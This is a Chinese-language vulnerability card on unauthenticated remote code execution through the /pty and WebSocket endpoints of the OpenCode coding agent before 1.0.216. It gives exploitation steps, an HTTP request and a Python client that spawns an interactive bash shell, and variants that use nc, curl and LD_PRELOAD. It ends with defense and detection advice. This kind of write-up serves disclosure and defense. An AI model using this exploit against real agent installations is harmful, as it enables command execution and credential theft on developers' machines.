---
id: ai-security-agent-security-opencode-unauth-pty-websocket-interactive-rce
title: OpenCode <1.0.216 无认证 /pty + WebSocket：任意 command/args/cwd/env 直接 spawn 成交互式 shell
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: opencode-unauth-pty-websocket-interactive-rce
tags:
- ai-security
- agent
- opencode
- coding-agent
- pty
- websocket
- rce
- unauth
- localhost
severity: critical
confidence: high
status: verified
affected_versions: < 1.0.216
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V166
  verified_at: '2026-11-06T13:30:23+08:00'
  notes: 已对照原文核对：OpenCode v1.0.215 源码与6张图确认无认证 POST /session、POST /session/:id/shell command 执行、POST /pty 任意 command/args/cwd/env 与 ws /pty/{id}/connect 直写 PTY，交互 shell 回显与卡片 ID/PID 一致；修复版本 1.0.216 与原文一致；未在本机复跑 PoC。
url: /docs/ai-security/agent-security/ai-security-agent-security-opencode-unauth-pty-websocket-interactive-rce/
draft: false
kb_aliases:
- OpenCode PTY 未授权
- OpenCode /pty 命令执行
- Pty.create 任意命令
- bun-pty spawn
- pty WebSocket 交互式 shell
- OpenCode 4096 pty
---

## 一句话结论

OpenCode `< 1.0.216` 的 HTTP 服务无任何认证，`POST /pty` 把请求体中的 `command`、`args`、`cwd`、`env` 原样交给 `bun-pty` 的 `spawn()`；随后攻击者连接 `ws://host:4096/pty/{id}/connect`，WebSocket 消息被直接写入伪终端进程，形成可交互、可回显的任意命令执行，比一次性 `/session/:id/shell` 更强大。

## 原理

- **无认证路由**：`packages/opencode/src/server/server.ts` 注册 `/pty` 相关路由（`POST /pty` 创建、`GET /pty` 列出、`GET /pty/:id` 查询、`DELETE /pty/:id` 删除，以及 WebSocket `/pty/:id/connect`），路由处理函数中没有 token、会话或权限校验；默认服务监听 `127.0.0.1:4096`，并配置通配 CORS，因此本机任意进程或允许 CORS 的网页都可调用。
- **完全用户可控的进程参数**：`Pty.create(input)` 取 `command = input.command || Shell.preferred()`、`args = input.args || []`、`cwd = input.cwd || Instance.directory`、`env = { ...process.env, ...input.env, TERM: "xterm-256color" }`，然后调用 `spawn(command, args, { name, cwd, env })`。`command` 与 `args` 是分离的 argv 数组，攻击者不局限注入某个固定 shell 的命令串，而是可以直接指定任意可执行文件及其参数。
- **WebSocket 直通 PTY**：`Pty.connect(id, ws)` 找到会话后把 `ws` 加入订阅者，先回放缓冲区输出；`onMessage` 对收到的内容只做 `session.process.write(String(message))`，没有任何过滤、命令白名单或确认。因此攻击者可以通过 WebSocket 发送 `id\n`、`cat /etc/passwd\n` 等，实时读取 PTY 的 stdout/stderr。
- **为什么比 `/shell` 更强**：`/session/:id/shell` 是一次性 `spawn` + 等待输出；PTY 提供真实终端语义，可运行交互式程序、维持长会话、处理需要 TTY 的命令（`sudo`、`ssh`、数据库客户端、编辑器等），并可随时切换到全交互 shell；同时 `cwd` 与 `env` 可控，能改变工作目录、PATH、代理/凭据环境等。
- **权限边界**：PTY 子进程继承 OpenCode 进程的环境与用户权限；开发机场景下通常是开发者本人，可访问源码、SSH 私钥、云凭证和本地配置文件。若服务被绑定到 `0.0.0.0` 或通过代理/端口映射暴露，网络攻击者可直接创建 PTY，不需要浏览器。
- **浏览器侧说明**：`POST /pty` 与普通 JSON 接口一样受 CORS 影响，通配配置允许任意来源读取创建结果；WebSocket 本身不受同源策略阻止，服务端也不校验 `Origin`。但 HTTPS 页面连接 `ws://127.0.0.1` 可能被混合内容策略拦截，因此浏览器驱动场景需结合页面协议/上下文判断；原文给出的验证脚本是本地 Python 客户端，直接访问本机 API。

## 触发条件

- 目标运行 OpenCode `< 1.0.216`，HTTP 服务在 4096 端口可达（默认仅本机，也可被代理/端口映射暴露）。
- 服务未加认证，攻击者能发送 `POST /pty` 并建立 WebSocket 连接。
- 进程用户有执行目标程序的权限；`cwd` 指定目录存在或可访问。
- 若从浏览器发起，恶意页面需能访问 `127.0.0.1:4096`，且 WebSocket 不被页面安全策略（如 HTTPS 混合内容）阻断。

## 利用步骤

1. `GET /global/health` 确认 OpenCode 服务可达，响应类似 `{"healthy":true,"version":"local"}`。
2. `POST /pty` 创建 PTY，body 至少包含 `{"command":"/bin/bash"}`；可选 `args`、`cwd`、`title`、`env`。响应返回 `id`、`pid`、`cwd`、`status`。
3. 连接 `ws://<host>:4096/pty/<id>/connect`，读取初始 banner/缓冲输出。
4. 通过 WebSocket 发送命令（追加换行），接收并解析输出；Linux 示例 `/bin/bash`，Windows 示例 `cmd.exe`。
5. 如需一次性执行，可创建 `/bin/sh` 并以 `args: ["-c", "id"]` 启动，或创建 shell 后发送单条命令。
6. 完成后 `DELETE /pty/<id>` 清理会话；授权测试使用无害命令并清理落地文件。

## PoC

最小 HTTP 创建请求：

```http
POST /pty HTTP/1.1
Host: 127.0.0.1:4096
Content-Type: application/json

{"command":"/bin/bash","args":[],"cwd":"/tmp","title":"demo"}
```

响应示例字段：`{"id":"pty_bb79b48d1001vuqksdsEz03HxK","pid":91982,"command":"/bin/bash","cwd":"/tmp","status":"running"}`。

WebSocket 交互（Python 伪代码）：

```python
import asyncio, json, websockets, aiohttp

async def main():
    async with aiohttp.ClientSession() as s:
        async with s.post("http://127.0.0.1:4096/pty",
                          json={"command": "/bin/bash", "args": [], "cwd": "/tmp"}) as r:
            pty = await r.json()
    uri = f"ws://127.0.0.1:4096/pty/{pty['id']}/connect"
    async with websockets.connect(uri) as ws:
        try:
            print(await asyncio.wait_for(ws.recv(), timeout=0.5), end="")
        except asyncio.TimeoutError:
            pass
        await ws.send("id\n")
        while True:
            try:
                print(await asyncio.wait_for(ws.recv(), timeout=1.0), end="")
            except asyncio.TimeoutError:
                break

asyncio.run(main())
```

一次性命令也可用 `curl` + `websocat` 完成同样流程；Windows 将 `command` 换成 `cmd.exe`、`args` 换成 `["/c","whoami"]`。

## 变体与关联

- **可执行文件变体**：`/bin/bash`、`/bin/sh`、`cmd.exe`、`powershell.exe`、`python`、`curl`、`nc` 等；`args` 可传 `-c`/`/c` 直接执行命令，也可启动任意交互程序。
- **环境/目录变体**：`cwd` 指向源码目录、Web 根目录或用户主目录；`env` 覆盖 `PATH`、`LD_PRELOAD`、代理变量、`HOME` 等，影响子进程加载与凭据读取。
- **端点变体**：同一无认证服务还提供 `GET /file/content`（任意文件读取，原文只列出未展开验证）与 `POST /session/:id/shell`（一次性命令执行，见关联卡）。
- **关联卡片**：[[ai-security-agent-security-opencode-unauth-session-shell-cors-rce]]（同版本 `/shell` + CORS 链）、[[web-nodejs-opencode-ai-url-param-xss-local-pty-rce]]（同产品 `Pty.create`，但入口是 url 参数 XSS，本卡无需 XSS）、[[ai-security-mcp-security-browser-use-webui-gradio-origin-bypass-csrf-stdio-rce]]（本地 AI 服务 CSRF→命令执行）。
- **边界**：服务未启动、端口不可达、加了认证或只允许可信 Origin 时不可利用；`cwd` 不存在或 `command` 不存在时创建失败；浏览器 WebSocket 可能受混合内容策略限制，直接网络访问不受此限。

## 检测与防御

- **升级与网络**：升级到 1.0.216 或更高版本；默认只监听 `127.0.0.1`，禁止将 4096 暴露到公网/不可信网络；远程访问放在认证反向代理或 SSH 隧道后。
- **认证与输入控制**：给 `/pty` 及 WebSocket 握手增加 token/会话认证与 Origin 校验；对 `command`/`args` 做 allowlist，禁止任意二进制与敏感 `cwd`/`env`；PTY 创建前要求用户确认。
- **最小权限**：以低权限用户运行 OpenCode，限制其可读的代码、凭据与目录；隔离敏感环境变量。
- **检测**：监控 `POST /pty`、`/pty/*/connect` WebSocket 连接及创建频率；审计 `bun-pty`/子进程树中的 shell、`id`、`cat`、`curl`、`nc` 等异常命令；检查 4096 监听地址、CORS 响应头与 OpenCode 版本；发现异常 PTY 会话立即 `DELETE` 并排查落地文件。
